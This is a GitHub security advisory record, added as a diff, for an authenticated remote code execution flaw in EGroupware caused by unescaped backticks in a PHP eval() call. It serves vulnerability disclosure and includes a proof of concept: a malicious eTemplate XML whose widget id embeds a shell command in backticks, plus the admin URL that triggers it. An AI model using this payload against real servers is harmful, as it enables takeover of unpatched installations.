@@ -1,0 +1,80 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-8737-2x9g-xjj7",
+  "modified": "2026-07-07T13:01:31Z",
+  "published": "2026-07-07T13:01:31Z",
+  "aliases": [
+    "CVE-2026-40187"
+  ],
+  "summary": "EGroupware has Authenticated RCE via Malicious eTemplate Upload",
+  "details": "## Summary\n\nAn authenticated administrator can achieve OS-level Remote Code Execution (RCE) by uploading a malicious eTemplate XML file (`.xet`) to the VFS `/etemplates` mount.\n\nThe `Widget::expand_name()` method passes template widget attribute values directly into a PHP `eval()` call with only double-quote escaping applied - **backtick characters are not escaped**.\n\nIn PHP, backticks inside a double-quoted `eval()` string execute shell commands. This allows an admin-level user to escalate from web\napplication access to arbitrary OS command execution on the server.\n\n------------------------------------------------------------------------\n\n## Details\n\nThe vulnerability is located in `api/src/Etemplate/Widget.php`, `Widget::expand_name()`:  (lines 703–728)\n\nThe method is designed to expand PHP variables (e.g., `$row`, `$col`,`$cont[id]`) in widget attribute values for auto-repeat grids. The `eval()` is triggered whenever `$name` contains a `$` character (line 706). The only sanitization applied before the eval is:\n\n``` php\nstr_replace('\"', '\\\\\"', $name)\n```\n\nThis escapes double quotes only. **Backtick characters are not escaped**. In PHP, backticks inside a double-quoted string in `eval()` are treated as shell execution operators — equivalent to  `shell_exec()`. A widget `id` of `$row\\`id`` produces:\n\n```\neval('$name = \"$row`id`\";');  // executes shell command: id\n```\n\n`expand_name()` is called from:\n\n-   `form_name()`\n-   `expand_widget()`\n-   `set_attrs()`\n-   `Template::run()`\n\nThe `/etemplates` VFS path is created exclusively for admin users — it is `chgrp`'d to `Admins` and `chmod`'d to `075` (Admins group has full rwx): class.filemanager_admin.inc.php:95-106\n\nCustom templates in `/etemplates` take precedence over built-in filesystem templates, meaning a malicious template can silently override any existing application template.\n\n\n**Mitigating factor**: The official Docker deployment sets `disable_functions = exec,passthru,shell_exec,system,proc_open,popen` in `php.ini`, which also blocks PHP backtick execution (backticks internally call shell_exec). Non-Docker or non-hardened deployments without this `php.ini` setting are fully vulnerable. Dockerfile:47\n\nThe current master branch in api/setup/setup.inc.php, confirming the vulnerability is present in the latest code as of today. setup.inc.php:14-17\n\n\n------------------------------------------------------------------------\n\n## Proof of Concept (PoC)\n\n### Prerequisites\n\n-   Admin account\n-   Non-Docker deployment, or Docker deployment where disable_functions has been removed/modified in php.ini\n\n\n### Step 1 — Mount /etemplates:\nLog in as admin, navigate to Admin → Filemanager → VFS Mounts, and click \"Install custom templates\". This executes the code in `filemanager_admin.inc.php` that mounts `/etemplates` with Admins-group write access.\n\n### Step 2 — Upload malicious template:\n\nCreate a file named `index.xet` with the following content:\n\n``` xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<overlay>\n  <template id=\"admin.index\">\n    <grid>\n      <columns><column/></columns>\n      <rows>\n        <row>\n          <textbox id=\"$row`touch /tmp/pwned_egw 2>/dev/null`\"/>\n        </row>\n      </rows>\n    </grid>\n  </template>\n</overlay>\n```\nUpload this file to `/etemplates/admin/templates/default/index.xet` via the VFS filemanager.\n\n\n### Step 3 — Trigger execution:\nNavigate to the EGroupware admin panel:\n```\nhttps://<target>/egroupware/index.php?menuaction=admin.admin_ui.index  \n```\nWhen the template is loaded and beforeSendToClient() runs, form_name() calls expand_name() with $name = '$row\\touch /tmp/pwned_egw 2>/dev/null`'and$row = 0`. The eval becomes:\n```\neval('$name = \"$row`touch /tmp/pwned_egw 2>/dev/null`\";');\n\n```\n\nPHP executes the backtick expression as a shell command.\n\n### Step 4 — Verify:\nCheck that `/tmp/pwned_egw` was created on the server. For a more impactful demonstration, replace `touch /tmp/pwned_egw` with `id > /tmp/pwned_egw` to capture the web server's OS user identity.\n\n\n\n------------------------------------------------------------------------\n\n## Impact\n\nAuthenticated Remote Code Execution (RCE) via eval() with unsanitized shell metacharacters.\n\nWho is impacted: Any EGroupware installation where:\n\n1. An admin account is compromised or a malicious admin exists, AND\n2. The server is not running with disable_functions blocking shell_exec (i.e., non-Docker or misconfigured deployments)\n\n------------------------------------------------------------------------\n\n## Severity\n\nThe vulnerability allows escalation from EGroupware admin-level web access to arbitrary OS command execution as the web server user (typically www-data). From there, an attacker can read configuration files (including database credentials), pivot to other services, or establish persistence. This is not exploitable by regular (non-admin) users. The official Docker deployment is not affected due to disable_functions, but bare-metal, VM, or custom container deployments without this hardening are fully vulnerable.",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "egroupware/egroupware"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "26.0.20251208"
+            },
+            {
+              "fixed": "26.4.20260413"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "< 26.0.20260113"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "egroupware/egroupware"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "23.1.20260601"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/EGroupware/egroupware/security/advisories/GHSA-8737-2x9g-xjj7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/EGroupware/egroupware"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-78",
+      "CWE-95"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-07-07T13:01:31Z",
+    "nvd_published_at": null
+  }
+}
